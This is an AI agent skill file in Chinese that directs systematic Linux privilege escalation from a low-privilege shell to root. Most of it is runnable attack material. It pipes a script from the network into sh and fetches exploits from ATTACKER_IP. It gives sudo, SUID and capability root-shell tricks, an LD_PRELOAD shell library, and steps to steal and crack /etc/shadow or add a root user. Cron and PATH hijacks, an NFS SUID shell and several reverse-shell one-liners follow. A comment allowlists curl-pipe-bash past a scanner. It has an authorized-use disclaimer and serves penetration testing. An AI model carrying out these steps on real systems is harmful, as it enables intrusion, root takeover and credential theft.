---
name: linux-privilege-escalation
description: "在 Linux 系统上执行系统化提权评估，识别并利用错误配置、脆弱服务和安全弱点，实现从低权限用户到 root 级别控制的提升。当用户要求'Linux提权'、'权限提升'、'privilege escalation'、'提权评估'或'Linux权限升级'时使用。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅可用于授权安全评估、防御验证或受控教育环境。

<!-- security-allowlist: curl-pipe-bash -->

# Linux 提权

## 目的

在 Linux 系统上执行系统化提权评估，识别并利用错误配置、脆弱服务和安全弱点，实现从低权限用户到 root 级别控制的提升。本技能覆盖内核漏洞、sudo 错误配置、SUID 二进制文件、cron 任务、capabilities、PATH 劫持和 NFS 弱点的全面枚举与利用。

## 输入 / 前提条件

### 所需访问权限
- 目标 Linux 系统的低权限 shell 访问
- 能够执行命令（交互式或半交互式 shell）
- 反弹 shell 连接所需的网络访问（如需要）
- 攻击者机器，用于托管 payload 和接收 shell

### 技术要求
- 理解 Linux 文件系统权限和所有权
- 熟悉常见 Linux 工具和脚本编写
- 了解内核版本及关联漏洞
- 具备基本的编译（gcc）知识，用于自定义 exploit

### 推荐工具
- LinPEAS、LinEnum 或 Linux Smart Enumeration 脚本
- Linux Exploit Suggester (LES)
- GTFOBins 参考，用于二进制文件利用
- John the Ripper 或 Hashcat，用于密码破解
- Netcat 或类似工具，用于反弹 shell

## 输出 / 交付物

### 主要输出
- 目标系统的 root shell 访问
- 提权路径文档
- 系统枚举发现报告
- 修复建议

### 证据产物
- 成功提权的截图
- 证明 root 访问的命令输出日志
- 已识别的漏洞详情
- 已利用的配置文件

## 核心工作流

### 阶段 1：系统枚举

#### 基本系统信息
收集基础系统信息，用于漏洞研究：

```bash
# Hostname and system role
hostname

# Kernel version and architecture
uname -a

# Detailed kernel information
cat /proc/version

# Operating system details
cat /etc/issue
cat /etc/*-release

# Architecture
arch
```

#### 用户和权限枚举

```bash
# Current user context
whoami
id

# Users with login shells
cat /etc/passwd | grep -v nologin | grep -v false

# Users with home directories
cat /etc/passwd | grep home

# Group memberships
groups

# Other logged-in users
w
who
```

#### 网络信息

```bash
# Network interfaces
ifconfig
ip addr

# Routing table
ip route

# Active connections
netstat -antup
ss -tulpn

# Listening services
netstat -l
```

#### 进程和服务枚举

```bash
# All running processes
ps aux
ps -ef

# Process tree view
ps axjf

# Services running as root
ps aux | grep root
```

#### 环境变量

```bash
# Full environment
env

# PATH variable (for hijacking)
echo $PATH
```

### 阶段 2：自动化枚举

部署自动化脚本进行全面枚举：

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./les.sh
```

将脚本传输到目标系统：

```bash
# On attacker machine
python3 -m http.server 8000

# On target machine
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 阶段 3：内核漏洞利用

#### 识别内核版本

```bash
uname -r
cat /proc/version
```

#### 搜索漏洞

```bash
# Use Linux Exploit Suggester
./linux-exploit-suggester.sh

# Manual search on exploit-db
searchsploit linux kernel [version]
```

#### 常见内核漏洞

| 内核版本 | 漏洞 | CVE |
|---------|------|-----|
| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
| 5.8+ | Dirty Pipe | CVE-2022-0847 |

#### 编译并执行

```bash
# Transfer exploit source
wget http://ATTACKER_IP/exploit.c

# Compile on target
gcc exploit.c -o exploit

# Execute
./exploit
```

### 阶段 4：Sudo 利用

#### 枚举 Sudo 权限

```bash
sudo -l
```

#### GTFOBins Sudo 利用
参考 https://gtfobins.github.io 获取利用命令：

```bash
# Example: vim with sudo
sudo vim -c ':!/bin/bash'

# Example: find with sudo
sudo find . -exec /bin/sh \; -quit

# Example: awk with sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# Example: python with sudo
sudo python -c 'import os; os.system("/bin/bash")'

# Example: less with sudo
sudo less /etc/passwd
!/bin/bash
```

#### LD_PRELOAD 利用
当 env_keep 包含 LD_PRELOAD 时：

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile shared library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute with sudo
sudo LD_PRELOAD=/tmp/shell.so find
```

### 阶段 5：SUID 二进制文件利用

#### 查找 SUID 二进制文件

```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### 利用 SUID 二进制文件
参考 GTFOBins 进行 SUID 利用：

```bash
# Example: base64 for file reading
LFILE=/etc/shadow
base64 "$LFILE" | base64 -d

# Example: cp for file writing
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# Example: find with SUID
find . -exec /bin/sh -p \; -quit
```

#### 通过 SUID 破解密码

```bash
# Read shadow file (if base64 has SUID)
base64 /etc/shadow | base64 -d > shadow.txt
base64 /etc/passwd | base64 -d > passwd.txt

# On attacker machine
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### 向 passwd 添加用户（当 nano/vim 具有 SUID 时）

```bash
# Generate password hash
openssl passwd -1 -salt new newpassword

# Add to /etc/passwd (using SUID editor)
newuser:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

### 阶段 6：Capabilities 利用

#### 枚举 Capabilities

```bash
getcap -r / 2>/dev/null
```

#### 利用 Capabilities

```bash
# Example: python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: vim with cap_setuid
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# Example: perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### 阶段 7：Cron 任务利用

#### 枚举 Cron 任务

```bash
# System crontab
cat /etc/crontab

# User crontabs
ls -la /var/spool/cron/crontabs/

# Cron directories
ls -la /etc/cron.*

# Systemd timers
systemctl list-timers
```

#### 利用可写 Cron 脚本

```bash
# Identify writable cron script from /etc/crontab
ls -la /opt/backup.sh        # Check permissions
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# If cron references non-existent script in writable PATH
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
chmod +x /home/user/antivirus.sh
```

### 阶段 8：PATH 劫持

```bash
# Find SUID binary calling external command
strings /usr/local/bin/suid-binary
# Shows: system("service apache2 start")

# Hijack by creating malicious binary in writable PATH
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
/usr/local/bin/suid-binary      # Execute SUID binary
```

### 阶段 9：NFS 利用

```bash
# On target - look for no_root_squash option
cat /etc/exports

# On attacker - mount share and create SUID binary
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /tmp/nfs

# Create and compile SUID shell
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell

# On target - execute
/share/shell
```

## 快速参考

### 枚举命令汇总
| 用途 | 命令 |
|------|------|
| 内核版本 | `uname -a` |
| 当前用户 | `id` |
| Sudo 权限 | `sudo -l` |
| SUID 文件 | `find / -perm -u=s -type f 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron 任务 | `cat /etc/crontab` |
| 可写目录 | `find / -writable -type d 2>/dev/null` |
| NFS 导出 | `cat /etc/exports` |

### 反弹 Shell 单行命令
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

### 关键资源
- GTFOBins: https://gtfobins.github.io
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester

## 约束和护栏

### 操作边界
- 在生产环境使用前，先在测试环境中验证内核漏洞
- 失败的内核漏洞可能导致系统崩溃
- 记录提权过程中所做的所有变更
- 仅在授权范围内维持访问持久性

### 技术限制
- 现代内核可能具备漏洞缓解机制（ASLR、SMEP、SMAP）
- AppArmor/SELinux 可能限制利用技术
- 容器环境限制了内核级别的漏洞利用
- 加固系统可能具有受限的 sudo 配置

### 法律和道德要求
- 测试前必须获得书面授权
- 保持在定义的范围内
- 立即报告关键发现
- 不得访问超出范围要求的数据

## 示例

### 示例 1：通过 find 命令 Sudo 提权到 Root

**场景**：用户拥有 find 命令的 sudo 权限

```bash
$ sudo -l
User user may run the following commands:
    (root) NOPASSWD: /usr/bin/find

$ sudo find . -exec /bin/bash \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 示例 2：利用 SUID base64 读取 Shadow 文件

**场景**：base64 二进制文件设置了 SUID 位

```bash
$ find / -perm -u=s -type f 2>/dev/null | grep base64
/usr/bin/base64

$ base64 /etc/shadow | base64 -d
root:$6$xyz...:18000:0:99999:7:::

# Crack offline with john
$ john --wordlist=rockyou.txt shadow.txt
```

### 示例 3：Cron 任务脚本劫持

**场景**：Root 的 cron 任务执行了可写脚本

```bash
$ cat /etc/crontab
* * * * * root /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh

$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh

# Wait 1 minute
$ /tmp/bash -p
# id
uid=1000(user) gid=1000(user) euid=0(root)
```

## 故障排除

| 问题 | 解决方案 |
|------|----------|
| 漏洞编译失败 | 检查 gcc：`which gcc`；在攻击者机器上为相同架构编译；使用 `gcc -static` |
| 反弹 shell 无法连接 | 检查防火墙；尝试 443/80 端口；使用分阶段 payload；检查出站过滤 |
| SUID 二进制文件无法利用 | 验证版本是否匹配 GTFOBins；检查 AppArmor/SELinux；某些二进制文件会丢弃权限 |
| Cron 任务未执行 | 验证 cron 运行状态：`service cron status`；检查 +x 权限；验证 crontab 中的 PATH |

## 何时使用
本技能适用于执行概述中所述的工作流或操作。
